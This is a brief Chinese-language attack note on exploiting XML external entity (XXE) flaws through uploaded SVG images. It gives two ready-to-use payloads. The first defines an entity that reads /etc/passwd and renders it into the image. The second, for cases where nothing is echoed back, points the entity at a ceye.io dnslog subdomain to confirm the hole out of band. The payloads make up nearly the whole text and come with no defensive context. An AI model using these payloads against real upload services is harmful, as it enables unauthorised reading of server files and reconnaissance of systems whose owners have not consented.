利用svg的xxe读文件，保存下方为svg图片，文件上传。
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///etc/passwd" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```
如果不回显，使用外部dtd或dnslog回显验证。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "2qytvx.ceye.io/xxe_test" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```